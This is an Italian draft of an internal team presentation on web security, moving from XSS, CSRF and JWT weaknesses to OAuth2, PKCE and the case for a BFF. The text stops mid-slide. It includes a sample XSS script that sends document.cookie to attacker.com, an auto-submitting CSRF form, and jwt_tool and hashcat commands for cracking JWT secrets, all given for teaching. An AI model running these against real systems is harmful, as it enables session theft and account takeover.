# Sicurezza Web Moderna: Da XSS a OAuth2 BFF

**Presentazione tecnica informale per il team**

## Slide 1: Intro - Perché parliamo di questo?

**Discorso:**

TODO

Ho pensato di integrare in questa presentazione, non le besta practice, ma anche una base sui concetti del mondo WEB e mostrarvi come funzionano davvero gli attacchi. E solo dopo un framework che ho fatto per consentire di semplificare lo sviluppo e tenere conto di aluni aspetti.

## Slide 2: XSS - Il Nemico Invisibile

**Cross-Site Scripting: quando il tuo sito esegue codice di qualcun altro**

```html
<!-- Un commento innocente? -->
<script>
  fetch("https://attacker.com/steal?data=" + document.cookie);
</script>
```

**Discorso:**

Partiamo dalle basi: XSS, Cross-Site Scripting. È uno degli attacchi più vecchi del web, ma è ancora dannatamente efficace.

Il concetto è semplice: un attaccante riesce a inyettare JavaScript malevolo nella tua applicazione. Può essere attraverso un campo di input non sanitizzato, un parametro URL, un commento in un forum... qualsiasi cosa che finisce renderizzata nel browser senza essere escapata.

Guardate questo esempio banale: un utente lascia un "commento" che in realtà è uno script. Se il tuo frontend lo renderizza così com'è, boom, quello script viene eseguato nel browser di chiunque visiti quella pagina.

E cosa può fare questo script? Tutto quello che può fare JavaScript: leggere i cookie, accedere al localStorage, fare richieste HTTP, modificare il DOM, rubare token di autenticazione...

Il problema vero è che se i tuoi token di autenticazione sono accessibili a JavaScript (tipo nel localStorage), un attacco XSS significa game over. L'attaccante ha accesso completo all'account dell'utente.

TODO: serve dire che i framework modermi prevengono questo ma ci sono comunque dei casi dove questo e' stato pobbilile bucare.
TODO: serve includere qualche caso di atacco famoso avvenuto di recente.

## Slide 3: CSRF - L'Attacco Silenzioso

**Cross-Site Request Forgery: quando il tuo browser lavora contro di te**

```html
<!-- Pagina dell'attaccante -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- Oppure più subdolo -->
<form action="https://yourapp.com/api/delete-account" method="POST">
  <input type="hidden" name="confirm" value="yes" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**Discorso:**

CSRF è più subdolo di XSS. Non richiede di inyettare codice nella tua app. L'attaccante crea una pagina malevola su un altro dominio e sfrutta il fatto che il browser invia automaticamente i cookie con ogni richiesta.

TODO: oppure tramite un link in una mail.

Scenario classico: sei loggato su yourapp.com. Visiti evil.com (magari perché hai cliccato su un link in una email di phishing). La pagina evil.com contiene un form nascosto che fa una POST a yourapp.com/api/delete-account.

Il browser, bravo cittadino che è, invia automaticamente i tuoi cookie di autenticazione con quella richiesta. Il server vede una richiesta autenticata e... cancella il tuo account.

"Ma aspetta," direte voi, "non bastano i CORS?"

TODO: dire che i cors non funzonano sempre. Certe volte la richiesta OPTIONS non viene neanche inviata per alcune chiamate, e magari il browser nonr iuscira a leggere la risposta, ma il serve la chiamata la esegue tranquillamente. E un meccanismo diverso, dedicato piu al browser che come una scurezza tulle vulnerabilita' cross site in generale

"E i token CSRF?" Sì, funzionano, ma c'è un modo più elegante: i cookie con `SameSite`.

Con `SameSite=strict`, il browser non invia il cookie se la richiesta proviene da un altro sito. Con `SameSite=lax`, lo invia solo per navigazioni top-level (tipo quando clicchi un link), ma non per richieste POST o fetch da altri domini.

Questo è fondamentale per capire come strutturare i cookie di autenticazione. Ne parliamo tra poco.

TODO: quindi guia qua possiabmo distinguere i primi due metodi principali di autenticazione: Quello che usa i bearer quindi ha il token dentro javascript e quindi accessibile a qualunque attacco XSS, e quello con i coockie che non sono vulnerabili a XSS ma alle XSRF, ma con delle configurazioni appropriate puo essere messo in totale sicurezza, mentre questo non vale per l'autenticazione fatta con gli header.

## Slide 4: Man-in-the-Middle - L'Intercettazione

**Quando qualcuno ascolta le tue conversazioni**

```
User → [Attacker] → Server

L'attaccante può:
- Leggere tutto il traffico
- Modificare richieste e risposte
- Rubare token e credenziali
```

**Discorso:**

Man-in-the-Middle è esattamente quello che sembra: qualcuno si mette in mezzo tra te e il server.

Può succedere su reti WiFi pubbliche non sicure, attraverso DNS poisoning, o se qualcuno compromette un router nella catena. L'attaccante vede tutto il traffico HTTP in chiaro.

La soluzione? HTTPS.

Ma HTTPS da solo non basta se poi i tuoi cookie non hanno il flag `secure: true`. Senza quel flag, il browser potrebbe inviare il cookie anche su connessioni HTTP, e lì l'attaccante può intercettarlo.

Questo è il motivo per cui tutti i cookie di autenticazione devono avere:

- `httpOnly: true` (protezione XSS)
- `secure: true` (protezione MITM)
- `sameSite: strict` o `lax` (protezione CSRF)

Vedete come questi attacchi sono interconnessi? Non puoi proteggerti da uno solo. Devi pensare alla sicurezza come a un sistema di difese multiple.

## Slide 5: I Cookie - Non Sono Tutti Uguali

**localStorage vs sessionStorage vs Cookies**

| Storage | Accessibile da JS | Vulnerabile a XSS | Inviato automaticamente | Scadenza |
||-|-|-|-|
| localStorage | ✅ Sì | ✅ Vulnerabile | ❌ No | Mai (manuale) |
| sessionStorage | ✅ Sì | ✅ Vulnerabile | ❌ No | Chiusura tab |
| Cookie normale | ✅ Sì | ✅ Vulnerabile | ✅ Sì | Configurabile |
| HTTP-only Cookie | ❌ No | ✅ Protetto | ✅ Sì | Configurabile |

**Discorso:**

Ok, parliamo di dove mettere i dati sensibili.

Ho visto troppi progetti dove i JWT vengono messi nel localStorage. "È comodo," dicono. "Posso accederci facilmente da JavaScript." Esatto, e può farlo anche un attaccante con un attacco XSS.

localStorage e sessionStorage sono accessibili a qualsiasi script che gira sulla tua pagina. Questo include:

- Il tuo codice
- Librerie di terze parti (analytics, ads, widget)
- Codice inyettato tramite XSS

TODO: dire che questo discorso si estende non solo a local storage, ma a qualunque posto che javascript puo raggiungere

Se uno qualsiasi di questi è compromesso, i tuoi token sono compromessi.

I cookie normali non sono molto meglio. Puoi leggerli con `document.cookie`, quindi stesso problema.

Ma i cookie HTTP-only? Quelli sono diversi. Il flag `httpOnly: true` dice al browser: "Questo cookie non deve essere accessibile a JavaScript. Mai. Per nessun motivo."

Puoi provare a fare `document.cookie` quanto vuoi, non lo vedrai. L'unico modo per accedere a un HTTP-only cookie è attraverso richieste HTTP, e solo il browser può farlo.

Questo è il primo pilastro della sicurezza dei token: HTTP-only cookies.

## Slide 6: Cookie Attributes - I Dettagli Che Contano

**Anatomia di un cookie sicuro**

```javascript
Set-Cookie: access_token=eyJhbG...;
  HttpOnly;
  Secure;
  SameSite=Strict;
  Path=/;
  Max-Age=3600
```

**Cosa significa ogni attributo:**

- `HttpOnly`: Non accessibile da JavaScript (anti-XSS)
- `Secure`: Solo su HTTPS (anti-MITM)
- `SameSite=Strict`: Mai inviato da altri siti (anti-CSRF)
- `SameSite=Lax`: Inviato solo su navigazioni top-level GET
- `Path=/`: Valido per tutto il sito
- `Max-Age=3600`: Scade dopo 1 ora

**Discorso:**

Ogni attributo di un cookie ha un significato preciso e una ragione di esistere. Non sono opzionali se vi interessa la sicurezza.

`HttpOnly` l'abbiamo già visto: protezione contro XSS. JavaScript non può toccarlo.

`Secure` significa che il cookie viene inviato solo su connessioni HTTPS. Se qualcuno prova a fare una richiesta HTTP, il browser non include il cookie. Questo protegge da downgrade attacks e MITM.

`SameSite` è più interessante. Ci sono tre valori:

1. `Strict`: Il cookie non viene mai inviato se la richiesta proviene da un altro sito. Massima sicurezza, ma può rompere alcuni flussi legittimi (tipo OAuth callbacks).

2. `Lax`: Il cookie viene inviato solo per navigazioni top-level GET. Se clicchi un link da google.com a yourapp.com, il cookie viene inviato. Ma se evil.com fa una POST o un fetch, no. È un buon compromesso.

3. `None`: Il cookie viene sempre inviato, anche cross-site. Richiede `Secure`. Usatelo solo se avete un motivo molto valido (tipo integrazioni con terze parti).

Per i token di autenticazione, usate `Strict`. Per i cookie del flusso OAuth (state, nonce, code_verifier), usate `Lax` perché dovete permettere il redirect dall'identity provider.

`Path` e `Max-Age` sono più semplici. Path limita dove il cookie è valido. Max-Age dice quando scade. Per i token di accesso, teneteli corti: 15 minuti, 1 ora max. Per i refresh token, potete andare più lunghi, ma con rotazione.

## Slide 8: OAuth 2.0 - Il Protocollo Che Regge Il Web

**OAuth 2.0: delegare l'accesso senza condividere password**

**I ruoli in OAuth2:**

- **Resource Owner**: L'utente (tu)
- **Client**: L'applicazione che vuole accedere
- **Authorization Server**: Chi gestisce l'autenticazione (Google, Microsoft, Cognito)
- **Resource Server**: L'API con i dati protetti

**Discorso:**

OAuth2 è il protocollo che permette a un'app di accedere alle tue risorse senza mai vedere la tua password.

Pensate a quando fate "Login con Google" su un sito. Non state dando la vostra password di Google a quel sito. State dicendo a Google: "Autorizza questo sito ad accedere al mio profilo." Google vi fa autenticare (se non lo siete già), vi chiede conferma, e poi dà al sito un token che rappresenta quella autorizzazione.

Questo è geniale per diversi motivi:

1. Il sito non vede mai la vostra password di Google
2. L'autorizzazione può essere limitata a specifiche risorse (scopes)

OAuth2 definisce diversi "flows" (flussi) per diversi scenari. Il più comune per le web app è l'Authorization Code Flow, che tra poco vediamo in dettaglio.

Ma prima, una cosa importante: OAuth2 da solo non è sicuro per applicazioni pubbliche (come le SPA). Perché? Perché il client secret non può essere tenuto segreto in un'app che gira nel browser. Chiunque può aprire DevTools e vedere il codice.

Per questo esiste PKCE, che vediamo tra poco. Ma prima, capiamo il flow base.

## Slide 9: Authorization Code Flow - Il Flusso Base

**Come funziona il flusso più comune di OAuth2**

```
1. User → Client: "Voglio fare login"
2. Client → Auth Server: "Redirect a /authorize"
3. User → Auth Server: Login e consenso
4. Auth Server → Client: Redirect con authorization code
5. Client → Auth Server: "Scambia code per token" (+ client secret)
6. Auth Server → Client: Access token + Refresh token
7. Client → Resource Server: API call con access token
```

**Discorso:**

L'Authorization Code Flow è il flusso OAuth2 più usato per le web app. Vediamo passo passo cosa succede.

1. L'utente clicca "Login" sulla vostra app.

2. La vostra app lo redirige all'authorization server (tipo Google) con parametri tipo:
   - `client_id`: identifica la vostra app
   - `redirect_uri`: dove tornare dopo il login
   - `scope`: cosa volete accedere (email, profilo, etc.)
   - `state`: un valore random per prevenire CSRF

3. L'utente fa login sull'authorization server (se non lo è già) e vede una schermata tipo "App X vuole accedere al tuo profilo. Autorizzare?"

4. Se l'utente accetta, l'authorization server lo redirige alla vostra `redirect_uri` con un `code` nell'URL. Questo code è monouso e scade velocemente (tipo 10 minuti).

5. La vostra app (lato server!) prende questo code e fa una richiesta POST all'authorization server per scambiarlo con i token veri. In questa richiesta include:
   - Il `code`
   - Il `client_id`
   - Il `client_secret` (questo è il motivo per cui deve essere server-side!)
   - La `redirect_uri` (per verifica)

6. L'authorization server valida tutto e risponde con:
   - `access_token`: per chiamare le API
   - `refresh_token`: per ottenere nuovi access token quando scadono
   - `id_token`: (se OIDC) con info sull'utente

7. Ora la vostra app può usare l'access token per chiamare le API protette.

Il punto chiave qui è che il client secret non viene mai esposto al browser. Solo il server lo conosce. Questo è sicuro per applicazioni server-side tradizionali.

Ma cosa succede con le Single Page Applications che non hanno un backend? O con le app mobile? Lì non puoi tenere segreto il client secret. Ed è qui che entra PKCE.

## Slide 10: PKCE - Proof Key for Code Exchange

**Come rendere OAuth2 sicuro senza client secret**

**Il problema:**

- SPA e app mobile non possono tenere segreti
- Authorization code può essere intercettato
- Attaccante potrebbe scambiare il code per token

**La soluzione PKCE:**

```
1. Client genera: code_verifier (random string)
2. Client calcola: code_challenge = SHA256(code_verifier)
3. Client invia code_challenge nell'authorization request
4. Auth Server memorizza code_challenge
5. Client riceve authorization code
6. Client invia code + code_verifier per ottenere token
7. Auth Server verifica: SHA256(code_verifier) === code_challenge
```

**Discorso:**

PKCE (si pronuncia "pixie") è un'estensione di OAuth2 che risolve un problema fondamentale: come fare OAuth in modo sicuro quando non puoi tenere segreto il client secret.

Il problema è questo: se un attaccante riesce a intercettare l'authorization code (tipo attraverso un malware sul dispositivo o un redirect malevolo), potrebbe usarlo per ottenere i token. Senza client secret, non c'è niente che impedisca questo attacco.

PKCE introduce una challenge crittografica:

1. Prima di iniziare il flusso OAuth, il client genera una stringa random chiamata `code_verifier`. Tipo 43 caratteri random.

2. Il client calcola l'hash SHA-256 di questa stringa, ottenendo il `code_challenge`.

3. Quando fa la richiesta di authorization, il client invia il `code_challenge` (non il verifier!) insieme agli altri parametri.

4. L'authorization server memorizza questo code_challenge associato all'authorization code che sta per generare.

5. Quando il client riceve l'authorization code e lo vuole scambiare per token, deve inviare anche il `code_verifier` originale.

6. L'authorization server calcola SHA-256 del code_verifier ricevuto e lo confronta con il code_challenge memorizzato. Se combaciano, rilascia i token.

Perché questo è sicuro? Perché anche se un attaccante intercetta l'authorization code, non ha il code_verifier. E non può calcolarlo dal code_challenge perché SHA-256 è una funzione one-way.

Il code_verifier non viene mai trasmesso fino al momento dello scambio finale, e a quel punto l'authorization code è già stato usato (sono monouso).

PKCE è ora raccomandato per tutti i client OAuth2, non solo quelli pubblici. È un layer di sicurezza aggiuntivo che non costa nulla implementare.

## Slide 11: State e Nonce - I Guardiani del Flusso

**Due parametri piccoli ma fondamentali**

**State Parameter:**

- Valore random generato dal client
- Inviato nell'authorization request
- Ritornato dall'auth server nel redirect
- Client verifica: state ricevuto === state inviato
- **Previene:** CSRF attacks sul flusso OAuth

**Nonce Parameter:**

- Valore random generato dal client
- Inviato nell'authorization request
- Incluso nell'ID token come claim
- Client verifica: nonce nel token === nonce generato
- **Previene:** Replay attacks dell'ID token

**Discorso:**

State e nonce sono due parametri che sembrano fare cose simili ma proteggono da attacchi diversi.

**State** è il più importante. Funziona così:

1. Prima di redirigere l'utente all'auth server, generi un valore random (tipo un UUID) e lo salvi (in un cookie HTTP-only con SameSite=lax).

2. Includi questo valore come parametro `state` nell'URL di authorization.

3. L'auth server lo ritorna identico nel redirect di callback.

4. Quando ricevi il callback, verifichi che lo state nell'URL corrisponda a quello che hai salvato.

Perché è importante? Previene un attacco CSRF specifico del flusso OAuth:

Un attaccante inizia un flusso OAuth sul suo browser, ottiene un authorization code, ma invece di completare il flusso, ti inganna a visitare l'URL di callback con quel code. Se non verifichi lo state, il tuo browser completerebbe il flusso e ti ritroveresti loggato come l'attaccante.

Con lo state, questo non funziona perché l'attaccante non può impostare cookie nel tuo browser.

**Nonce** è simile ma per l'ID token:

1. Generi un valore random e lo salvi.
2. Lo includi nell'authorization request.
3. L'auth server lo include come claim nell'ID token.
4. Quando ricevi l'ID token, verifichi che il nonce nel token corrisponda a quello salvato.

Questo previene replay attacks: se qualcuno intercetta un ID token e prova a riusarlo, il nonce non corrisponderà.

Nella pratica, con PKCE, state, nonce, e HTTPS, il flusso OAuth è molto sicuro. Ma solo se implementi tutte queste protezioni. Saltarne una apre vulnerabilità.

## Slide 12: JWT - Anatomia di un Token

**JSON Web Token: il formato che ha conquistato il mondo**

**Struttura:**

```
header.payload.signature
```

**Header:**

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-id-123"
}
```

**Payload:**

```json
{
  "sub": "user-id-123",
  "email": "user@example.com",
  "iat": 1234567890,
  "exp": 1234571490,
  "iss": "https://auth.example.com",
  "aud": "my-app-client-id"
}
```

**Signature:**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

**Discorso:**

JWT è diventato lo standard de facto per i token di autenticazione. Ma è anche una delle cose più fraintese e implementate male.

Un JWT ha tre parti separate da punti:

1. **Header**: metadati sul token. L'algoritmo usato per firmarlo (`alg`), il tipo (`typ`), e opzionalmente un key ID (`kid`) se usi key rotation.

2. **Payload**: i dati veri, chiamati "claims". Ci sono claims standard come:
   - `sub` (subject): l'ID dell'utente
   - `iat` (issued at): quando è stato creato
   - `exp` (expiration): quando scade
   - `iss` (issuer): chi l'ha emesso
   - `aud` (audience): per chi è destinato

   E puoi aggiungere claims custom come `email`, `role`, `groups`, etc.

3. **Signature**: la firma crittografica che prova che il token non è stato modificato.

Ogni parte è Base64URL-encoded (non encrypted!). Chiunque può decodificare un JWT e leggere il contenuto. La firma serve solo a verificare l'integrità, non la confidenzialità.

Questo è importante: **non mettete dati sensibili in un JWT** a meno che non lo crittografiate separatamente (JWE). Il JWT è come una busta trasparente con un sigillo. Tutti vedono cosa c'è dentro, ma il sigillo garantisce che nessuno l'ha modificato.

Gli algoritmi di firma più comuni sono:

- **HS256**: HMAC con SHA-256. Simmetrico, usa una secret key condivisa.
- **RS256**: RSA con SHA-256. Asimmetrico, usa chiave privata per firmare e pubblica per verificare.
- **ES256**: ECDSA con SHA-256. Asimmetrico, più efficiente di RSA.

Per sistemi distribuiti, RS256 o ES256 sono preferibili perché puoi distribuire la chiave pubblica per la verifica senza esporre la chiave privata.

## Slide 13: JWT Vulnerabilities - Quando I Token Si Rompono

**Le vulnerabilità JWT più comuni e pericolose**

**1. alg: "none" Attack**

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Token senza firma. Se il server non valida l'algoritmo, accetta qualsiasi cosa.

**2. Algorithm Confusion**

```
Token firmato con HS256 usando la chiave pubblica RSA come secret
```

Confondere algoritmi simmetrici e asimmetrici.

**3. Weak Secrets**

```
secret: "secret123"
```

Brute-force in minuti.

**4. Missing Claim Validation**

```
Non verificare exp, iss, aud, sub
```

Token scaduti, per altre app, o modificati vengono accettati.

**5. Token in localStorage**

```javascript
localStorage.setItem("token", jwt);
```

Vulnerabile a XSS.

**Discorso:**

Ora viene la parte interessante: come si rompono i JWT. Ho letto gli articoli che mi hai passato e ci sono pattern ricorrenti di vulnerabilità.

**1. L'attacco alg: "none"**

Questo è il più assurdo ma anche il più comune. Il JWT spec permette un algoritmo "none" per token non firmati (per testing). Alcune librerie, se non configurate correttamente, accettano questi token.

Un attaccante prende un JWT valido, cambia l'header in `{"alg": "none"}`, rimuove la firma, modifica il payload come vuole (tipo `"role": "admin"`), e lo invia. Se il server non valida esplicitamente l'algoritmo, lo accetta.

CVE-2015-9235 ha colpito la libreria jsonwebtoken di Node.js proprio per questo. La fix? Specificare sempre esplicitamente quali algoritmi accetti:

```javascript
jwt.verify(token, secret, { algorithms: ["RS256"] });
```

Mai fidarsi dell'algoritmo dichiarato nel token.

**2. Algorithm Confusion**

Questo è più sottile. Immagina un sistema che usa RS256 (asimmetrico). Il server ha la chiave pubblica per verificare i token.

Un attaccante cambia l'algoritmo in HS256 (simmetrico) e firma il token usando la chiave pubblica come secret HMAC. Se il server non valida l'algoritmo e usa la stessa chiave per verificare, il token viene accettato.

Perché funziona? Perché HS256 usa la stessa chiave per firmare e verificare, mentre RS256 usa chiavi diverse. Se il server usa la chiave pubblica (che l'attaccante conosce) per verificare un token HS256, l'attaccante può creare token validi.

**3. Weak Secrets**

Se usi HS256 con un secret debole tipo "secret", "password", o il nome della tua azienda, un attaccante può fare brute-force offline. Prende un JWT valido, prova migliaia di secret comuni, e quando trova quello giusto può creare token validi.

Ho visto secret come "jwt-secret-key" in produzione. Ci sono wordlist pubbliche con i secret JWT più comuni. Usate secret random di almeno 256 bit.

**4. Missing Claim Validation**

Anche se la firma è valida, devi validare i claims:

- `exp`: il token è scaduto? Se non controlli, token vecchi funzionano per sempre.
- `iss`: chi ha emesso il token? Se non controlli, token di altri sistemi potrebbero essere accettati.
- `aud`: per chi è il token? Se non controlli, un token per app A potrebbe funzionare su app B.
- `sub`: chi è l'utente? Se non controlli, un attaccante potrebbe sostituire token tra utenti.

Ho visto sistemi che verificavano la firma ma non l'expiration. Token di anni fa funzionavano ancora.

**5. Storage Insicuro**

Ne abbiamo già parlato, ma lo ripeto: localStorage è accessibile a JavaScript. Un attacco XSS ruba tutto. Usate HTTP-only cookies.

Questi non sono bug teorici. Sono vulnerabilità trovate in produzione, in app usate da milioni di persone. Auth0 ha avuto problemi con JWT validation. Uber ha avuto problemi. Non siete immuni.

## Slide 14: JWT Attack Tools - Come Gli Attaccanti Operano

**Gli strumenti che gli attaccanti (e i security tester) usano**

**jwt.io**

- Decoder online
- Vede header, payload, signature
- Usato per analisi iniziale

**jwt_tool**

```bash
# Dictionary attack
python3 jwt_tool.py <token> -d wordlist.txt

# Algorithm confusion
python3 jwt_tool.py <token> -X a

# Signature bypass
python3 jwt_tool.py <token> -X s
```

**Hashcat**

```bash
# Brute-force JWT secret
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**Discorso:**

Voglio mostrarvi gli strumenti che gli attaccanti usano, perché capire come attaccano vi aiuta a difendervi meglio.

**jwt.io** è il punto di partenza. È un sito pubblico dove incolli un JWT e vedi cosa c'è dentro. Tutti lo usano, sviluppatori e attaccanti. È comodo per debugging, ma ricordatevi: se potete vedere cosa c'è nel token, può farlo anche un attaccante.

**jwt_tool** è lo strumento professionale per testare JWT. È uno script Python che automatizza tutti gli attacchi comuni:

- Prova l'attacco alg: none
- Testa algorithm confusion
- Fa brute-force del secret con wordlist
- Prova a modificare claims e rigenerare la firma
- Testa key confusion attacks

L'ho usato in security assessment e trova vulnerabilità in minuti. Se il vostro sistema è vulnerabile a uno di questi attacchi, jwt_tool lo scopre.

**Hashcat** è il tool di password cracking più potente. Supporta JWT cracking (mode 16500). Se il vostro secret è debole, Hashcat lo trova. Con una GPU moderna, può provare miliardi di combinazioni al secondo.

Il punto è: questi tool sono pubblici e facili da usare. Non servono competenze avanzate. Se il vostro JWT ha vulnerabilità, qualcuno le troverà.

La buona notizia? Potete usare questi stessi tool per testare il vostro sistema prima che lo faccia un attaccante.

## Slide 15: JWT Best Practices - Come Fare Le Cose Bene

**Checklist per JWT sicuri**

✅ **Algoritmo esplicito**

```javascript
jwt.verify(token, secret, { algorithms: ["RS256"] });
```

✅ **Secret forte (o meglio, asimmetrico)**

```javascript
// NO
const secret = "mysecret";

// SÌ
const secret = crypto.randomBytes(32).toString("hex");

// MEGLIO
// Usa RS256 con chiavi RSA
```

✅ **Validazione completa dei claims**

```javascript
jwt.verify(token, publicKey, {
  algorithms: ["RS256"],
  issuer: "https://auth.example.com",
  audience: "my-app",
  maxAge: "1h",
});
```

✅ **Token short-lived**

```javascript
// Access token: 15 minuti - 1 ora
// Refresh token: giorni/settimane, ma con rotazione
```

✅ **Storage sicuro**

```javascript
// HTTP-only, Secure, SameSite cookies
res.cookie("access_token", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  maxAge: 3600000,
});
```

✅ **JWKS per key rotation**

```javascript
// Pubblica chiavi pubbliche su /.well-known/jwks.json
// Usa kid (key ID) nell'header per identificare la chiave
```

**Discorso:**

Ok, basta con gli attacchi. Come si fa bene?

**1. Algoritmo esplicito**

Mai, mai, mai fidarsi dell'algoritmo dichiarato nel token. Specificate sempre esplicitamente quali algoritmi accettate. Se usate RS256, accettate solo RS256. Non "qualsiasi algoritmo che il token dice di usare".

**2. Secret forte o asimmetrico**

Se usate HS256, il secret deve essere cryptographically random e lungo almeno 256 bit. Non "password123", non il nome della vostra app, non qualcosa che potrebbe essere in una wordlist.

Ma meglio ancora: usate algoritmi asimmetrici come RS256 o ES256. Con questi, la chiave privata sta solo sull'authorization server. I resource server hanno solo la chiave pubblica. Anche se un resource server viene compromesso, l'attaccante non può creare token validi.

**3. Validazione completa**

Verificare la firma non basta. Dovete validare:

- `exp`: il token è scaduto?
- `nbf`: il token è già valido?
- `iat`: quando è stato emesso?
- `iss`: chi l'ha emesso?
- `aud`: per chi è destinato?
- `sub`: chi è l'utente?

Ogni claim ha un significato e una ragione di esistere. Validateli tutti.

**4. Token short-lived**

Gli access token devono essere short-lived. 15 minuti è un buon compromesso. 1 ora è il massimo che consiglierei. Più lunghi sono, più tempo ha un attaccante se li ruba.

"Ma allora l'utente deve fare login ogni 15 minuti?" No, per questo ci sono i refresh token. L'access token scade velocemente, ma il refresh token dura più a lungo e può essere usato per ottenere nuovi access token.

E i refresh token devono essere rotated: ogni volta che li usi, ne ottieni uno nuovo e il vecchio viene invalidato. Questo limita il danno se vengono rubati.

**5. Storage sicuro**

HTTP-only, Secure, SameSite cookies. L'abbiamo detto mille volte ma lo ripeto perché è fondamentale. Non localStorage, non sessionStorage, non cookie normali. HTTP-only cookies.

**6. JWKS e key rotation**

Per sistemi in produzione, implementate key rotation. Pubblicate le vostre chiavi pubbliche su un endpoint JWKS (JSON Web Key Set), tipo `/.well-known/jwks.json`. Usate il campo `kid` (key ID) nell'header del JWT per identificare quale chiave è stata usata.

Questo vi permette di:

- Ruotare le chiavi senza downtime
- Revocare chiavi compromesse
- Avere chiavi diverse per ambienti diversi

Key rotation è una di quelle cose che sembrano complicate ma sono essenziali per la sicurezza a lungo termine.

## Slide 16: ID Token vs Access Token - Quale Usare?

**Due token, due scopi diversi**

**ID Token (OpenID Connect):**

- Formato: JWT
- Scopo: Identificare l'utente
- Audience: La tua applicazione (client)
- Contiene: sub, email, name, etc.
- Dove usarlo: Solo per sapere chi è l'utente
- Validazione: Firma, iss, aud, exp, nonce

**Access Token (OAuth2):**

- Formato: JWT o opaque
- Scopo: Autorizzare accesso alle risorse
- Audience: Il resource server (API)
- Contiene: scope, permissions
- Dove usarlo: Nelle chiamate API
- Validazione: Firma, iss, aud, exp, scope

**Errore comune:**

```javascript
// ❌ SBAGLIATO
fetch("/api/users", {
  headers: { Authorization: `Bearer ${idToken}` },
});

// ✅ CORRETTO
fetch("/api/users", {
  headers: { Authorization: `Bearer ${accessToken}` },
});
```

**Discorso:**

Questa è una confusione che vedo costantemente: usare l'ID token per chiamare le API.

Quando fate OAuth + OpenID Connect, ricevete due token:

**ID Token**: è un JWT che contiene informazioni sull'utente. Chi è, la sua email, il suo nome, etc. È destinato alla vostra applicazione (il client). Lo usate per sapere chi si è loggato. Punto. Non lo mandate alle API.

**Access Token**: è il token che autorizza l'accesso alle risorse. Può essere un JWT o un token opaco (una stringa random). È destinato al resource server (la vostra API). Lo mandate con ogni richiesta API nell'header Authorization.

Perché questa distinzione?

1. **Audience diversa**: L'ID token ha `aud` = il vostro client ID. L'access token ha `aud` = l'API. Se mandate l'ID token all'API, l'audience non corrisponde e dovrebbe essere rifiutato.

2. **Scopo diverso**: L'ID token dice "chi sei". L'access token dice "cosa puoi fare". Sono informazioni diverse.

3. **Lifetime diverso**: L'ID token può durare più a lungo perché non viene usato per accedere a risorse. L'access token deve essere short-lived.

4. **Claims diversi**: L'ID token ha claims sull'identità (email, name). L'access token ha claims sui permessi (scope, roles).

Nella pratica, molti sistemi usano JWT per entrambi e li fanno sembrare simili. Ma concettualmente sono diversi e vanno usati per scopi diversi.

Nel BFF che ho costruito, l'ID token viene usato solo per estrarre informazioni sull'utente (sub, email) che poi vengono passate al backend come header. L'access token viene usato se il backend deve chiamare altre API protette.

## Slide 17: Token Refresh - Gestire La Scadenza

**Come mantenere l'utente loggato senza compromettere la sicurezza**

**Il problema:**

- Access token short-lived (15 min)
- Utente non vuole fare login ogni 15 minuti
- Soluzione: Refresh token

**Il flusso:**

```
1. Login → Access token (15 min) + Refresh token (7 giorni)
2. Usa access token per API calls
3. Access token scade
4. Usa refresh token per ottenere nuovo access token
5. Nuovo access token + nuovo refresh token (rotation)
6. Vecchio refresh token invalidato
```

**Refresh token rotation:**

```javascript
// Ogni refresh genera un nuovo refresh token
POST /oauth2/token
{
  "grant_type": "refresh_token",
  "refresh_token": "old_refresh_token"
}

Response:
{
  "access_token": "new_access_token",
  "refresh_token": "new_refresh_token"  // ← Nuovo!
}

// Il vecchio refresh token è ora invalido
```

**Discorso:**

Access token short-lived sono sicuri ma creano un problema UX: l'utente dovrebbe fare login ogni 15 minuti. Inaccettabile.

La soluzione è il refresh token. È un token long-lived (giorni o settimane) che può essere usato per ottenere nuovi access token senza richiedere login.

Il flusso è:

1. Al login, ricevi access token (scade tra 15 min) e refresh token (scade tra 7 giorni).

2. Usi l'access token per le chiamate API normali.

3. Quando l'access token sta per scadere (o è già scaduto), usi il refresh token per ottenerne uno nuovo.

4. L'authorization server ti dà un nuovo access token (e un nuovo refresh token).

5. Il vecchio refresh token viene invalidato.

Questo ultimo punto è cruciale: **refresh token rotation**. Ogni volta che usi un refresh token, ne ottieni uno nuovo e il vecchio smette di funzionare.

Perché è importante? Perché limita il danno se un refresh token viene rubato:

- Se l'attaccante usa il refresh token rubato, ottiene un nuovo token ma invalida quello della vittima.
- La vittima prova a usare il suo refresh token (ora invalido) e il sistema rileva l'anomalia.
- Il sistema può revocare tutti i token di quella sessione.

Questo è chiamato "refresh token reuse detection". Se un refresh token viene usato due volte, è un segnale di compromissione.

Nel BFF, implemento questo pattern. I refresh token sono in HTTP-only cookies, vengono rotated ad ogni uso, e se rilevo riuso, revoco tutto.

## Slide 18: Il Problema delle SPA - Perché Serve un BFF

**Single Page Applications e OAuth2: un matrimonio difficile**

**I problemi delle SPA:**

1. **Nessun backend sicuro**
   - Client secret non può essere segreto
   - Tutto il codice è visibile nel browser

2. **Storage insicuro**
   - localStorage → vulnerabile a XSS
   - Cookie normali → accessibili a JS

3. **CORS complications**
   - API su dominio diverso
   - Preflight requests
   - Cookie non inviati cross-domain

4. **Token refresh complesso**
   - Gestire timing nel frontend
   - Race conditions
   - Stato distribuito tra tab

5. **Nessun posto per i segreti**
   - Client secret esposto
   - Encryption keys esposte
   - API keys esposte

**La soluzione: Backend for Frontend (BFF)**

**Discorso:**

Arriviamo al cuore del problema che mi ha spinto a costruire il BFF.

Le Single Page Applications sono fantastiche per UX. React, Vue, Angular... permettono di costruire interfacce fluide e reattive. Ma hanno un problema fondamentale con la sicurezza: non c'è un posto sicuro dove mettere i segreti.

Tutto il codice JavaScript gira nel browser. Chiunque può aprire DevTools e vedere tutto. Questo crea problemi:

**1. Client secret**

OAuth2 tradizionale richiede un client secret. Ma se lo metti nel codice JavaScript, non è più segreto. Chiunque può vederlo. PKCE risolve questo, ma...

**2. Storage dei token**

Dove metti i token? localStorage è comodo ma vulnerabile a XSS. Cookie normali sono accessibili a JavaScript, stesso problema. HTTP-only cookies risolvono questo, ma...

**3. CORS**

